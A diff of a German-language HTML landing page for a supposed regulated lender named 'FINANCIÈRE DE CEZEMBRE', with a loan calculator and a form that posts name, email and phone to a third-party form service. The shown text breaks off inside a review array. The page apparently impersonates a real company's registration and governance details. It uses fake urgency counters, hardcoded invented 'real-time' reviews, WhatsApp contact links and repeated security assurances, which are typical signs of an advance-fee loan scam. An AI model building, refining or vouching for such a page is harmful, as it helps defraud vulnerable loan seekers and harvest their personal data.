@@ -2,249 +2,83 @@
 <html lang="de">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>FINANCIÈRE DE CEZEMBRE | Institutionelle Kreditlösungen</title>
     
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%23001A4D'/><text y='70' x='15' font-family='serif' font-size='55' font-weight='bold' fill='%23C5A059'>FC</text></svg>">
-
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <style>
         :root {
-            --navy: #001A4D;
-            --gold: #C5A059;
-            --bright-gold: #FFD700; 
-            --deep-gold: #E6B800; 
-            --light-bg: #F4F7FA;
-            --white: #FFFFFF;
-            --whatsapp: #25D366;
-            --success: #27ae60;
+            --navy: #001A4D; --gold: #C5A059; --bright-gold: #FFD700; 
+            --deep-gold: #E6B800; --light-bg: #F4F7FA; --white: #FFFFFF;
+            --whatsapp: #25D366; --success: #27ae60;
         }
-
-        .goog-te-banner-frame.skiptranslate, .goog-te-gadget-icon { display: none !important; }
-        body { top: 0px !important; }
-        .goog-te-gadget-simple { background-color: transparent !important; border: none !important; }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        
-        body { 
-            background-color: var(--white); 
-            color: #333; 
-            overflow-x: hidden; 
-            top: 0 !important; 
-            position: static !important; 
-        }
+        body { background-color: var(--white); color: #333; overflow-x: hidden; width: 100%; }
 
         header {
-            background: var(--white); padding: 20px 8%; display: flex;
+            background: var(--white); padding: 15px 8%; display: flex;
             justify-content: space-between; align-items: center;
-            position: fixed; width: 100%; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            position: fixed; width: 100%; top: 0; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
 
-        .logo-container { display: flex; align-items: center; gap: 15px; }
-        .logo-sigle { 
-            background: var(--navy); color: var(--gold); width: 38px; height: 38px; 
-            display: flex; align-items: center; justify-content: center; 
-            font-weight: 700; font-family: serif; border-radius: 4px; font-size: 1.1rem;
-            border: 1px solid var(--gold); flex-shrink: 0;
-        }
-        .logo { font-weight: 700; font-size: 1.4rem; color: var(--navy); letter-spacing: -1px; }
-        
-        .nav-links { display: flex; gap: 30px; align-items: center; }
-        .nav-links a { text-decoration: none; color: #666; font-size: 0.9rem; font-weight: 500; transition: 0.3s; cursor: pointer; }
-        .nav-links a:hover { color: var(--gold); text-shadow: 0 0 8px rgba(197, 160, 89, 0.4); }
-
-        .intl-badge {
-            font-size: 0.7rem; font-weight: 700; color: var(--gold); 
-            border: 1px solid var(--gold); padding: 5px 10px;
-            display: flex; align-items: center; gap: 8px;
-        }
+        .logo-container { display: flex; align-items: center; gap: 10px; }
+        .logo-sigle { background: var(--navy); color: var(--gold); width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; font-weight: 700; border-radius: 4px; border: 1px solid var(--gold); }
+        .logo { font-weight: 700; font-size: 1.1rem; color: var(--navy); }
 
         .hero {
-            height: 100vh; background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), 
+            min-height: 100vh; background: linear-gradient(rgba(0,26,77,0.75), rgba(0,26,77,0.75)), 
             url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000');
             background-size: cover; background-position: center;
-            display: flex; align-items: center; padding: 0 8%; color: var(--white);
+            display: flex; align-items: center; justify-content: space-between; padding: 100px 8% 50px; color: var(--white);
+            flex-wrap: wrap;
         }
 
-        .hero-content { 
-            max-width: 600px; 
-            position: relative;
-            z-index: 1;
-            padding: 20px;
-            background: radial-gradient(circle at center, rgba(197, 160, 89, 0.2) 0%, transparent 70%);
-            border-radius: 50%;
-        }
-        .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
-        
         .simulator { 
-            background: var(--white); padding: 30px 40px; border-radius: 2px; width: 480px; 
-            box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); 
-            position: relative; overflow: hidden; min-height: 480px;
+            background: var(--white); padding: 25px; border-radius: 8px; width: 100%; max-width: 450px; 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3); color: var(--navy); position: relative; z-index: 10;
         }
 
-        .btn-group-flex {
-            display: flex;
-            gap: 10px;
-            margin-top: 10px;
+        /* CADENAS DE SÉCURITÉ FORMULAIRE */
+        .secure-badge-footer {
+            margin-top: 20px; padding: 15px; background: #f9f9f9; border: 1px dashed var(--gold);
+            border-radius: 6px; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px;
         }
-        .btn-wa-inline {
-            background: var(--whatsapp);
-            color: white;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 12px 20px;
-            border-radius: 4px;
-            font-size: 1.4rem;
-            transition: 0.3s;
-            flex: 1;
-        }
-        .btn-wa-inline:hover { background: #128C7E; transform: scale(1.05); }
+        .secure-badge-footer i { color: var(--gold); font-size: 1.8rem; }
+        .secure-badge-footer p { font-size: 0.75rem; color: #444; font-weight: 600; line-height: 1.4; }
 
-        @media (max-width: 991px) {
-            .hero { flex-direction: column; height: auto; padding: 120px 5% 50px; text-align: center; }
-            .hero-content { max-width: 100%; margin-bottom: 40px; }
-            .hero-content h1 { font-size: 2.2rem; }
-            .simulator { width: 100%; max-width: 420px; padding: 20px; min-height: auto; }
-            .stats-bar { flex-direction: column; gap: 30px; }
-            .f-grid, .legal-block { margin-left: 0 !important; text-align: center; }
-            .f-grid { grid-template-columns: 1fr; }
-            .reviews-grid { grid-template-columns: 1fr !important; padding: 20px !important; }
-            footer { padding-bottom: 160px !important; } 
-            .wa-assistant-container { bottom: 15px; left: 15px; }
-            .whatsapp-float-dynamic { width: 52px; height: 52px; font-size: 28px; }
-            /* AJUSTEMENT MOBILE BOUTON VERT */
-            .live-btn { width: 100%; max-width: 280px; justify-content: center; margin: 0 auto 15px auto !important; height: 32px; display: flex !important; align-items: center !important; }
-        }
-
-        .reviews-section { padding: 80px 8%; background: var(--light-bg); text-align: center; }
-        .reviews-section h2 { color: var(--navy); margin-bottom: 20px; font-size: 2rem; }
-        
-        .trust-badge-container {
-            display: inline-flex; align-items: center; justify-content: center;
-            background: white; padding: 12px 30px; border-radius: 50px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid rgba(197, 160, 89, 0.3);
-            margin-bottom: 40px;
-        }
-        .trust-stars { color: var(--bright-gold); font-size: 1.1rem; letter-spacing: 3px; }
-        .trust-lock { 
-            color: var(--gold); font-size: 1.6rem; margin: 0 20px;
-            animation: pulse-lock 3s infinite ease-in-out; 
-        }
-        @keyframes pulse-lock {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.15); opacity: 0.8; }
-        }
-
-        .reviews-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; }
+        /* ANIMATION DES AVIS */
+        .reviews-section { padding: 60px 8%; background: var(--light-bg); overflow: hidden; }
+        #reviews-container { display: flex; flex-direction: column; gap: 15px; max-width: 800px; margin: 0 auto; height: 500px; overflow: hidden; position: relative; }
         
         .review-card { 
-            background: white; padding: 25px; border-radius: 8px; 
-            box-shadow: 0 10px 20px rgba(0,0,0,0.05); text-align: left; 
-            border-top: 3px solid var(--gold); transition: all 0.4s ease;
+            background: white; padding: 20px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); 
+            border-left: 5px solid var(--gold); animation: slideInReview 0.6s ease-out forwards;
         }
-        .review-card:hover { 
-            transform: translateY(-5px); box-shadow: 0 15px 30px rgba(197, 160, 89, 0.2); 
+        @keyframes slideInReview { from { opacity: 0; transform: translateY(-50px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* RESPONSIVE MOBILE */
+        @media (max-width: 991px) {
+            header { padding: 10px 5%; }
+            .logo { font-size: 0.9rem; }
+            .hero { padding-top: 130px; justify-content: center; text-align: center; }
+            .hero-content h1 { font-size: 2rem; margin-bottom: 20px; }
+            .simulator { margin-top: 20px; padding: 20px; }
         }
 
-        .stars { color: var(--bright-gold); margin-bottom: 5px; font-size: 0.9rem; }
-        .review-date { font-size: 0.7rem; color: #999; margin-bottom: 10px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
-        .review-date i { color: var(--success); }
-        .review-text { font-style: italic; font-size: 0.9rem; color: #555; margin-bottom: 15px; line-height: 1.6; min-height: 60px; }
-        .review-author { font-weight: 700; color: var(--navy); font-size: 0.85rem; display: flex; align-items: center; justify-content: space-between; }
-        .verified { color: var(--success); font-size: 0.7rem; text-transform: uppercase; font-weight: 800; }
-
+        /* RESTE DES STYLES DU SIMULATEUR */
         .sim-row { margin-bottom: 15px; }
-        .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 8px; font-size: 0.85rem; }
-        .sim-row label span { color: var(--navy); font-weight: 800; } 
-        
-        input[type="range"] { 
-            -webkit-appearance: none; width: 100%; height: 5px; background: #ddd; border-radius: 5px; outline: none;
-            background-image: linear-gradient(var(--bright-gold), var(--bright-gold));
-            background-repeat: no-repeat; background-size: 0% 100%;
-        }
-        input[type="range"]::-webkit-slider-thumb { 
-            -webkit-appearance: none; height: 20px; width: 20px; border-radius: 50%; 
-            background: var(--navy); cursor: pointer; border: 2px solid white; box-shadow: 0 0 5px rgba(0,0,0,0.3);
-        }
-        
-        .result-area { background: var(--light-bg); padding: 15px; text-align: center; border: 1px solid #EEE; margin-bottom: 15px; border-radius: 4px; }
-        .result-area p { font-size: 0.75rem; margin-bottom: 2px; color: var(--navy); font-weight: 700; opacity: 0.8; }
-        .result-area span { font-size: 1.8rem; font-weight: 800; color: var(--navy); }
-        
-        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 15px; font-weight: 800; font-size: 1rem; cursor: pointer; transition: 0.3s; border-radius: 4px; }
-        .btn-main:hover { background: var(--gold); transform: scale(1.02); }
-
-        .form-input { 
-            width: 100%; padding: 12px; border: 2.5px solid var(--deep-gold); 
-            background-color: var(--white); border-radius: 4px; margin-bottom: 10px; 
-            font-size: 1rem; outline: none; color: #000c24; font-weight: 600; 
-        }
-
-        .scrolling-security {
-            background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 6px 0; margin: 10px 0;
-            overflow: hidden; white-space: nowrap; border-top: 1px solid #d1ecf1; border-bottom: 1px solid #d1ecf1;
-            display: flex;
-        }
-        .scrolling-security span {
-            display: inline-block; padding-left: 100%; animation: scroll-text 30s linear infinite; font-weight: 600;
-        }
-        @keyframes scroll-text { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
-
-        .shine-white { color: #FFFFFF !important; animation: blink-white 3s infinite; }
-        @keyframes blink-white { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; text-shadow: 0 0 10px #fff; } }
-
-        #loader-overlay {
-            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px;
-        }
-        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
-        .stat-box h3 { font-size: 2rem; color: var(--gold); }
-
-        .about-section { padding: 100px 15%; line-height: 2; text-align: justify; background: var(--white); }
-        .about-section h2 { margin-bottom: 30px; color: var(--navy); text-align: center; }
-
-        footer { background: #0A0A0A; color: #888; padding: 80px 8% 40px; font-size: 0.8rem; }
-        .f-grid, .legal-block { margin-left: 160px; }
-        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 50px; margin-bottom: 50px; }
-        .f-grid h4 { color: white; margin-bottom: 20px; font-size: 0.9rem; }
-        .legal-block { border-top: 1px solid #222; padding-top: 40px; line-height: 1.8; }
-        .tag-warning { border: 1px solid #444; padding: 15px; margin-top: 20px; color: #AAA; text-align: center; }
-        .blink-gold { color: var(--gold); font-weight: 700; animation: pulse-text 1.5s infinite; }
-        @keyframes pulse-text { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-
-        .wa-assistant-container { position: fixed; bottom: 30px; left: 30px; z-index: 9999; display: flex; flex-direction: column; align-items: center; }
-        .whatsapp-float-dynamic { background-color: var(--whatsapp); color: #FFF; width: 65px; height: 65px; border-radius: 50%; text-align: center; font-size: 35px; box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); display: flex; align-items: center; justify-content: center; text-decoration: none; position: relative; animation: magnet-pulse 2s infinite ease-in-out; }
-        
-        @keyframes magnet-pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); } 10% { transform: scale(1.1) rotate(5deg); } 20% { transform: scale(1.1) rotate(-5deg); } 30% { transform: scale(1.1) rotate(5deg); } 40% { transform: scale(1) rotate(0deg); } 70% { box-shadow: 0 0 0 20px rgba(37, 211, 102, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); } }
-        
-        #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; display: none; }
-        
-        /* CORRECTIF ALIGNEMENT BOUTON VERT */
-        .live-btn { 
-            background: rgba(39, 174, 96, 0.1); 
-            border: 1px solid var(--success);
-            color: var(--success);
-            padding: 0 15px;
-            border-radius: 50px;
-            font-size: 0.75rem;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 15px;
-            height: 35px; /* Hauteur fixe pour éviter l'étirement */
-            white-space: nowrap;
-        }
-        .dot-live { width: 8px; height: 8px; background: var(--success); border-radius: 50%; animation: blink-dot 1s infinite; flex-shrink: 0; }
-        @keyframes blink-dot { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(1.2); } 100% { opacity: 1; transform: scale(1); } }
+        .sim-row label { display: flex; justify-content: space-between; font-weight: 700; font-size: 0.85rem; }
+        input[type="range"] { width: 100%; height: 6px; accent-color: var(--navy); margin-top: 10px; cursor: pointer; }
+        .result-area { background: #f0f4f8; padding: 15px; text-align: center; border-radius: 5px; margin: 15px 0; border: 1px solid #dce4ec; }
+        .result-area span { font-size: 1.8rem; font-weight: 800; }
+        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 15px; font-weight: 800; border-radius: 5px; cursor: pointer; transition: 0.3s; }
+        .btn-main:hover { background: var(--gold); }
+        .form-input { width: 100%; padding: 12px; margin-bottom: 10px; border: 2px solid #eee; border-radius: 5px; outline: none; font-weight: 600; }
+        .form-input:focus { border-color: var(--gold); }
     </style>
 </head>
 <body>
@@ -254,226 +88,166 @@
         <div class="logo-sigle">FC</div>
         <div class="logo">FINANCIÈRE DE CEZEMBRE</div>
     </div>
-    <div class="nav-links">
-        <a href="#about">Expertise</a>
-        <a href="#legal">Gouvernance</a>
-        <a onclick="goToStep1()" href="#simBox">Kontakt</a>
-        <div id="google_translate_element" style="display:none;"></div>
-        <div class="intl-badge"><i class="fas fa-globe"></i> SICHERES INTERNATIONALES PORTAL</div>
+    <div style="font-size: 0.7rem; color: var(--gold); font-weight: 700; border: 1px solid var(--gold); padding: 4px 8px; border-radius: 3px;" class="mobile-hide">
+        <i class="fas fa-lock"></i> SECURE PORTAL
     </div>
 </header>
 
-<div class="wa-assistant-container">
-    <a href="https://wa.me/33780976404" class="whatsapp-float-dynamic" target="_blank"><i class="fab fa-whatsapp"></i></a>
-</div>
-
 <section class="hero">
     <div class="hero-content">
-        <h1>Finanzielle Exzellenz <br>für Ihre Projekte.</h1>
-        <p style="margin-bottom: 30px; opacity: 0.9;">Zuverlässiger Partner seit 1990. Regulierte institutionelle Kreditvergabe.</p>
-        
-        <div style="display: flex; gap: 20px; align-items: center;">
-            <div style="position: relative; display: flex; align-items: center; justify-content: center;">
-                <i class="fas fa-certificate" style="color: #FFD700; font-size: 3.5rem;"></i>
-                <i class="fas fa-check" style="color: var(--navy); position: absolute; font-size: 1.2rem; font-weight: 900;"></i>
-            </div>
-            <p>
-                <strong style="color: #FFD700; font-size: 0.9rem; letter-spacing: 1px;">ZUGELASSENES INSTITUT</strong><br>
-                <strong>Eingetragen unter RCS 552 058 943</strong><br>
-                Unter der Aufsicht der französischen Bankenbehörden.
-            </p>
+        <h1 style="color:white;">Finanzielle Exzellenz <br>für Ihre Projekte.</h1>
+        <p style="margin: 20px 0; font-size: 1.1rem; opacity: 0.9;">Zuverlässiger Partner seit 1990. Regulierte institutionelle Kreditvergabe.</p>
+        <div style="display: flex; gap: 15px; align-items: center; background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; backdrop-filter: blur(5px);">
+            <i class="fas fa-shield-check" style="font-size: 2.5rem; color: var(--bright-gold);"></i>
+            <p style="font-size: 0.8rem;"><strong>ZUGELASSENES INSTITUT</strong><br>Eingetragen unter RCS 552 058 943. Unter der Aufsicht der Bankenbehörden.</p>
         </div>
     </div>
 
     <div class="simulator" id="simBox">
-        <div id="loader-overlay">
-            <div id="loading-content">
-                <div class="spinner"></div>
-                <p id="loader-text" style="font-weight: 600; color: var(--navy);">Analyse läuft...</p>
-            </div>
-            <div id="success-message">
-                <i class="fas fa-check-circle" style="color:var(--success); font-size:3rem;"></i>
-                <h3 style="color: var(--navy); margin: 10px 0;">ANTRAG GESPEICHERT</h3>
-                <p style="font-size: 0.85rem; margin-bottom: 15px;">Fallnummer: #CEZ-2026</p>
-                <button class="btn-main" onclick="resetAll()">OK</button>
-            </div>
-        </div>
-
         <div id="step1">
-            <div class="live-btn"><div class="dot-live"></div> 12 Personen schauen sich dieses Angebot gerade an</div>
+            <div style="background: rgba(39, 174, 96, 0.1); color: var(--success); padding: 8px; border-radius: 4px; font-size: 0.75rem; font-weight: 700; margin-bottom: 20px; text-align: center; border: 1px solid var(--success);">
+                <i class="fas fa-circle" style="font-size: 7px; animation: blink-dot 1s infinite;"></i> 14 Personen schauen sich dieses Angebot gerade an
+            </div>
             
-            <h3 style="margin-bottom: 15px; font-size: 1.1rem;">Kreditrechner</h3>
             <div class="sim-row">
-                <label>PROJEKTBETRAG <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:800; width:70px; background:transparent; color: var(--navy); font-size:0.9rem;"> €</span></label>
+                <label>BETRAG: <span><strong id="amtText">15000</strong> €</span></label>
                 <input type="range" id="amtRange" min="1000" max="75000" step="500" value="15000">
             </div>
             <div class="sim-row">
-                <label>LAUFZEIT <span id="durText" style="color: var(--navy); font-weight: 800;">36 Monate</span></label>
+                <label>LAUFZEIT: <span><strong id="durText">36</strong> Monate</span></label>
                 <input type="range" id="durRange" min="6" max="84" step="6" value="36">
             </div>
+
             <div class="result-area">
-                <p>GESCHÄTZTE MONATSRATE (3.5% FESTZINS)</p>
-                <span id="monthlyRes">0.00</span> <span style="color: var(--navy); font-weight: 800; font-size: 1.4rem;">€</span>
+                <p style="font-size: 0.7rem; color: #666; font-weight: 700;">MONATSRATE (3.5% FESTZINS)</p>
+                <span id="monthlyRes">439.53</span> €
             </div>
 
-            <div class="btn-group-flex">
-                <button type="button" class="btn-main" style="flex: 2.5;" onclick="goToStep2()">MEINEN ANTRAG STELLEN</button>
-                <a href="https://wa.me/33780976404?text=Hallo,%20ich%20habe%20Interesse." 
-                   class="btn-wa-inline" target="_blank">
-                    <i class="fab fa-whatsapp"></i>
-                </a>
-            </div>
-            
-            <div class="scrolling-security">
-                <span><i class="fas fa-lock" style="color:var(--gold);"></i> 256-Bit-SSL-Verschlüsselung • Garantierter Schutz • Ihre Daten sont streng vertraulich.</span>
-            </div>
-            <div class="security-tag" style="font-size: 0.65rem;"><i class="fas fa-lock"></i> IHR DOSSIER IST 100% SICHER</div>
+            <button class="btn-main" onclick="goToStep2()">MEINEN ANTRAG STELLEN</button>
+            <p style="text-align: center; font-size: 0.65rem; margin-top: 10px; color: #999;"><i class="fas fa-info-circle"></i> Unverbindliche Online-Sofortzusage</p>
         </div>
 
         <div id="step2" style="display:none;">
-            <h3 style="margin-bottom: 15px; font-size: 1.1rem;">Antrag abschließen</h3>
-            <form id="loanForm">
+            <h3 style="margin-bottom: 15px; font-size: 1rem; text-align: center;">Antrag abschließen</h3>
+            <form id="loanForm" action="https://api.web3forms.com/submit" method="POST">
                 <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
-                <input type="hidden" name="montant_client" id="hiddenAmt"><input type="hidden" name="duree_client" id="hiddenDur"><input type="hidden" name="mensualite_client" id="hiddenMens">
-                <input type="text" name="nom" placeholder="Vor- und Nachname" class="form-input" required>
-                <select name="projet" class="form-input" required>
-                    <option value="" disabled selected>Wählen Sie Ihr Projekt</option>
-                    <option value="Immobilier">Immobilienkredit</option>
-                    <option value="Personnel">Privatkredit</option>
-                    <option value="Auto">Auto / Motorrad</option>
-                    <option value="Travaux">Renovierung</option>
-                </select>
-                <select name="pays" class="form-input" required>
-                    <option value="Allemagne" selected>Deutschland (+49)</option>
-                    <option value="France">Frankreich (+33)</option>
-                    <option value="Belgique">Belgien (+32)</option>
-                    <option value="Suisse">Schweiz (+41)</option>
-                </select>
-                <input type="tel" name="telephone" placeholder="Telefon (z.B. +49...)" class="form-input" required>
+                <input type="text" name="name" placeholder="Vollständiger Name" class="form-input" required>
                 <input type="email" name="email" placeholder="E-Mail-Adresse" class="form-input" required>
-                <button type="submit" class="btn-main">ABSENDEN BESTÄTIGEN</button>
+                <input type="tel" name="phone" placeholder="Telefonnummer" class="form-input" required>
+                <button type="submit" class="btn-main">BESTÄTIGEN & ABSENDEN</button>
             </form>
+
+            <div class="secure-badge-footer">
+                <i class="fas fa-lock"></i>
+                <p><strong>100% SICHERE DATENÜBERTRAGUNG</strong><br>Ihre Unterlagen sind SSL-verschlüsselt geschützt. Wir garantieren absoluten Datenschutz: Ihre Daten werden niemals an Dritte verkauft.</p>
+            </div>
+            <p onclick="goToStep1()" style="text-align: center; cursor: pointer; color: #999; font-size: 0.75rem; margin-top: 10px;">← Zurück zum Rechner</p>
         </div>
     </div>
 </section>
 
-<section class="stats-bar">
-    <div class="stat-box"><h3>1 200 000 €</h3><p>Grundkapital</p></div>
-    <div class="stat-box"><h3>3.5%</h3><p>Vorzugszinssatz</p></div>
-    <div class="stat-box"><h3>100%</h3><p>Digital & Sicher</p></div>
-</section>
-
 <section class="reviews-section">
-    <h2>Vertrauen unserer internationalen Kunden</h2>
-    <div class="trust-badge-container">
-        <div class="trust-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-        <div class="trust-lock"><i class="fas fa-lock"></i></div>
-        <div class="trust-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-    </div>
-    <div class="reviews-grid" id="reviews-container"></div>
+    <h2 style="text-align: center; color: var(--navy); margin-bottom: 40px;">Kundenfeedback in Echtzeit</h2>
+    <div id="reviews-container">
+        </div>
 </section>
-
-<section class="about-section" id="about">
-    <h2>Eine Referenzinstitution</h2>
-    <p>FINANCIÈRE DE CEZEMBRE mit Sitz in Ergué-Gabéric (29500) ist eine führende Aktiengesellschaft im Bereich der Kreditvergabe (Code APE 64.92Z). Mit einem Grundkapital von 1.200.000 Euro gewährleistet unser Institut eine strenge Verwaltung von Beteiligungen und komplexen Finanzoperationen.</p>
-</section>
-
-<footer id="legal">
-    <div class="f-grid">
-        <div><h4 class="shine-white">FINANCIÈRE DE CEZEMBRE</h4><p>Regulierte Kreditverteilung.<br>LEI : 969500WONJGTDZG8E035</p></div>
-        <div><h4>HAUPTSITZ</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, Frankreich</p></div>
-        <div><h4>GOUVERNANCE</h4><p>M. Michel Pajot<br>Bolloré SE, Financière Arnil.</p></div>
-        <div><h4>AUDIT</h4><p>Constantin Associés<br>BEAS (La Défense)</p></div>
-    </div>
-    <div class="legal-block">
-        <strong>RECHTLICHE INFORMATIONEN :</strong> FINANCIÈRE DE CEZEMBRE SA. SIRET 552 058 943 00044. Unterliegt der ACPR. 
-        <div class="tag-warning"><span class="blink-gold">EIN KREDIT VERPFLICHTET SIE UND MUSS ZURÜCKGEZAHLT WERDEN.</span></div>
-    </div>
-</footer>
-
-<div id="goUp" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="fas fa-arrow-up"></i></div>
 
 <script>
-    /* AVIS TRADUITS EN ALLEMAND UNIQUEMENT */
-    const internationalReviews = [
-        { n: "Marc L.", p: "Frankreich", t: "Schnelle Finanzierung und ein sehr professionelles Team. Mein Projekt wurde in Rekordzeit realisiert." },
-        { n: "Thomas W.", p: "Luxemburg", t: "Seriöses und reaktionsschnelles Institut für meinen Grenzgängerkredit. Top-Service!" },
-        { n: "Jean-Paul H.", p: "Luxemburg", t: "Sehr professioneller Service aus Luxemburg-Stadt. Danke für die Unterstützung!" },
-        { n: "Sophie D.", p: "Belgien", t: "Effizient und sicher. Eine große Hilfe beim Kauf meines neuen Fahrzeugs." },
-        { n: "Elena V.", p: "Schweiz", t: "Hervorragende Bearbeitung meines Kreditantrags. Sehr höfliches und kompetentes Team." },
-        { n: "Lars O.", p: "Deutschland", t: "Sehr zufrieden mit dem Zinssatz und der schnellen Abwicklung. Absolut empfehlenswert." },
-        { n: "João P.", p: "Portugal", t: "Einfacher und transparenter Prozess. Ich kann Cézembre nur wärmstens empfehlen." },
-        { n: "Luc B.", p: "Monaco", t: "Hochklassiger Service und absolute Diskretion. Perfekt für meine Investition." },
-        { n: "Robert H.", p: "Deutschland", t: "Endlich eine Bank, die wirklich zuhört. Sehr zufrieden mit meinem Kredit." },
-        { n: "Dimitri V.", p: "Belgien", t: "Sehr zufrieden mit der schnellen Rückmeldung der Berater. Alles reibungslos." }
+    // --- LOGIQUE CALCULATEUR ---
+    const amtR = document.getElementById('amtRange');
+    const durR = document.getElementById('durRange');
+
+    function calculate() {
+        const p = parseFloat(amtR.value);
+        const n = parseInt(durR.value);
+        const r = 0.035 / 12;
+        const m = (p * r) / (1 - Math.pow(1 + r, -n));
+        document.getElementById('amtText').innerText = p;
+        document.getElementById('durText').innerText = n;
+        document.getElementById('monthlyRes').innerText = m.toFixed(2);
+    }
+    amtR.oninput = calculate; durR.oninput = calculate; calculate();
+
+    function goToStep2() { document.getElementById('step1').style.display='none'; document.getElementById('step2').style.display='block'; }
+    function goToStep1() { document.getElementById('step2').style.display='none'; document.getElementById('step1').style.display='block'; }
+
+    // --- BASE DE DONNÉES DE 40 AVIS DYNAMIQUES ---
+    const allReviews = [
+        { n: "Hans M.", l: "Berlin", t: "Sehr schnelle Auszahlung für mein Autoprojekt. 5 Sterne!" },
+        { n: "Brigitte S.", l: "München", t: "Endlich eine unkomplizierte Lösung ohne viel Papierkram." },
+        { n: "Thomas K.", l: "Hamburg", t: "Professionelle Beratung und ein sehr fairer Zinssatz." },
+        { n: "Elena R.", l: "Zürich", t: "Der Prozess war klar und transparent. Sehr zu empfehlen." },
+        { n: "Marc V.", l: "Brüssel", t: "Toller Support per WhatsApp, mein Kredit war in 48h da." },
+        { n: "Sarah L.", l: "Wien", t: "Ich war erst skeptisch, aber der Service ist wirklich top." },
+        { n: "Wolfgang D.", l: "Köln", t: "Die Umschuldung hat wunderbar geklappt. Danke!" },
+        { n: "Sabine F.", l: "Frankfurt", t: "Sehr diskret und zuverlässig. Alles online erledigt." },
+        { n: "Lukas P.", l: "Stuttgart", t: "Alles bestens, Geld war nach 3 Tagen auf dem Konto." },
+        { n: "Monika H.", l: "Leipzig", t: "Freundliches Team und kompetente Abwicklung." },
+        { n: "Jürgen W.", l: "Dortmund", t: "Gute Konditionen für meinen Renovierungskredit." },
+        { n: "Petra G.", l: "Essen", t: "Sicheres Portal, ich habe mich gut aufgehoben gefühlt." },
+        { n: "Christian B.", l: "Bremen", t: "Schnelle Rückmeldung nach dem Online-Antrag." },
+        { n: "Anja M.", l: "Dresden", t: "Sehr zufrieden mit der gesamten Kommunikation." },
+        { n: "Klaus T.", l: "Hannover", t: "Alles wie versprochen gelaufen. Keine versteckten Kosten." },
+        { n: "Ursula K.", l: "Nürnberg", t: "Kompetente Partner für meine Immobilienfinanzierung." },
+        { n: "Stefan S.", l: "Duisburg", t: "Reibungsloser Ablauf von Anfang bis Ende." },
+        { n: "Heike L.", l: "Bochum", t: "Hervorragender Service, auch am Wochenende erreichbar." },
+        { n: "Andreas J.", l: "Wuppertal", t: "Einfach, schnell und absolut sicher." },
+        { n: "Renate O.", l: "Bielefeld", t: "Hatte mein Geld innerhalb kürzester Zeit. Top!" },
+        { n: "Michael B.", l: "Bonn", t: "Sehr zu empfehlen für dringende Projekte." },
+        { n: "Gabriele C.", l: "Münster", t: "Hatte erst Bedenken wegen Online-Kredit, aber alles sicher." },
+        { n: "Peter N.", l: "Karlsruhe", t: "Sehr faires Angebot bekommen. Gerne wieder." },
+        { n: "Bärbel E.", l: "Mannheim", t: "Alles unbürokratisch und digital abgewickelt." },
+        { n: "Frank R.", l: "Augsburg", t: "Sehr zufrieden mit den flexiblen Ratenoptionen." },
